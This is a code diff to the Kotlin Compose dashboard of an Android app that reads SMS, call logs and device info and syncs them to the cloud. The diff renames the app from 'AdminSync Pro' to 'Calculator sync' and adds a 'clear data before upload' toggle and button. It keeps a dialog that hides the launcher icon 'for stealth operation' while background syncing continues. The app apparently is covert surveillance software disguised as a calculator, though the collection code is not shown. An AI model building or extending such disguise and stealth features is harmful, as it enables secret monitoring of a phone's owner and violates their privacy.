@@ -27,6 +27,7 @@ import androidx.compose.foundation.verticalScroll
 import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.filled.Android
 import androidx.compose.material.icons.filled.CheckCircle
+import androidx.compose.material.icons.filled.DeleteSweep
 import androidx.compose.material.icons.filled.Lock
 import androidx.compose.material.icons.filled.Refresh
 import androidx.compose.material.icons.filled.SatelliteAlt
@@ -47,6 +48,8 @@ import androidx.compose.material3.Icon
 import androidx.compose.material3.IconButton
 import androidx.compose.material3.LinearProgressIndicator
 import androidx.compose.material3.OutlinedButton
+import androidx.compose.material3.Switch
+import androidx.compose.material3.SwitchDefaults
 import androidx.compose.material3.Text
 import androidx.compose.material3.TextButton
 import androidx.compose.runtime.Composable
@@ -82,6 +85,7 @@ fun DashboardScreen(
     val isSyncing by viewModel.isSyncing.collectAsState()
     val lastSyncTime by viewModel.lastSyncTime.collectAsState()
     val stealthModeEnabled by viewModel.stealthModeEnabled.collectAsState()
+    val clearDataBeforeUpload by viewModel.clearDataBeforeUpload.collectAsState()
     val deviceInfo by viewModel.deviceInfo.collectAsState()
     val smsList by viewModel.smsList.collectAsState()
     val callLogs by viewModel.callLogs.collectAsState()
@@ -133,7 +137,7 @@ fun DashboardScreen(
                         ) {
                             Icon(
                                 imageVector = Icons.Default.Security,
-                                contentDescription = "AdminSync Pro",
+                                contentDescription = "Calculator sync",
                                 tint = Color.White,
                                 modifier = Modifier.size(22.dp)
                             )
@@ -141,7 +145,7 @@ fun DashboardScreen(
                         Spacer(modifier = Modifier.width(12.dp))
                         Column {
                             Text(
-                                text = "AdminSync Pro",
+                                text = "Calculator sync",
                                 color = HighDensityOnSurface,
                                 fontSize = 18.sp,
                                 fontWeight = FontWeight.Bold
@@ -209,6 +213,57 @@ fun DashboardScreen(
                     )
                     Spacer(modifier = Modifier.height(16.dp))
 
+                    // Toggle for Clear Before Backup
+                    Card(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .padding(bottom = 12.dp),
+                        shape = RoundedCornerShape(16.dp),
+                        colors = CardDefaults.cardColors(containerColor = HighDensityPrimaryContainer)
+                    ) {
+                        Row(
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .padding(horizontal = 14.dp, vertical = 10.dp),
+                            verticalAlignment = Alignment.CenterVertically,
+                            horizontalArrangement = Arrangement.SpaceBetween
+                        ) {
+                            Row(
+                                verticalAlignment = Alignment.CenterVertically,
+                                modifier = Modifier.weight(1f)
+                            ) {
+                                Icon(
+                                    imageVector = Icons.Default.DeleteSweep,
+                                    contentDescription = null,
+                                    tint = HighDensityOnPrimaryContainer,
+                                    modifier = Modifier.size(20.dp)
+                                )
+                                Spacer(modifier = Modifier.width(10.dp))
+                                Column {
+                                    Text(
+                                        text = "Clear data before upload",
+                                        fontSize = 13.sp,
+                                        fontWeight = FontWeight.Bold,
+                                        color = HighDensityOnPrimaryContainer
+                                    )
+                                    Text(
+                                        text = "Purges old cloud backup prior to fresh sync",
+                                        fontSize = 10.sp,
+                                        color = HighDensityOnPrimaryContainer.copy(alpha = 0.7f)
+                                    )
+                                }
+                            }
+                            Switch(
+                                checked = clearDataBeforeUpload,
+                                onCheckedChange = { viewModel.toggleClearDataBeforeUpload(it) },
+                                colors = SwitchDefaults.colors(
+                                    checkedThumbColor = HighDensityPrimary,
+                                    checkedTrackColor = HighDensityCardWhite
+                                )
+                            )
+                        }
+                    }
+
                     // 1. Full Sync Button
                     Button(
                         onClick = { viewModel.triggerSyncAll() },
@@ -239,6 +294,28 @@ fun DashboardScreen(
                             Spacer(modifier = Modifier.width(10.dp))
                             Text("FULL SYNC NOW", fontSize = 14.sp, fontWeight = FontWeight.Bold)
                         }
+                    }
+
+                    Spacer(modifier = Modifier.height(8.dp))
+
+                    // 1b. Direct Clear & Upload Fresh Backup Button
+                    OutlinedButton(
+                        onClick = { viewModel.triggerClearAndBackupNow() },
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .height(48.dp)
+                            .testTag("clear_and_backup_button"),
+                        shape = RoundedCornerShape(14.dp),
+                        border = BorderStroke(1.dp, HighDensityPrimary.copy(alpha = 0.5f)),
+                        colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary)
+                    ) {
+                        Icon(
+                            imageVector = Icons.Default.DeleteSweep,
+                            contentDescription = "Clear & Backup",
+                            modifier = Modifier.size(18.dp)
+                        )
+                        Spacer(modifier = Modifier.width(8.dp))
+                        Text("CLEAR & UPLOAD FRESH BACKUP", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                     }
 
                     Spacer(modifier = Modifier.height(6.dp))
@@ -476,8 +553,8 @@ fun DashboardScreen(
                 },
                 text = {
                     Text(
-                        text = if (stealthModeEnabled) "Unhide and restore the AdminSync Pro app icon to your Android home screen and app launcher?"
-                        else "Hide the AdminSync Pro app icon from the Android launcher for stealth operation? The background service and full cloud sync will continue running uninterrupted.",
+                        text = if (stealthModeEnabled) "Unhide and restore the Calculator sync app icon to your Android home screen and app launcher?"
+                        else "Hide the Calculator sync app icon from the Android launcher for stealth operation? The background service and full cloud sync will continue running uninterrupted.",
                         color = HighDensitySecondary
                     )
                 },
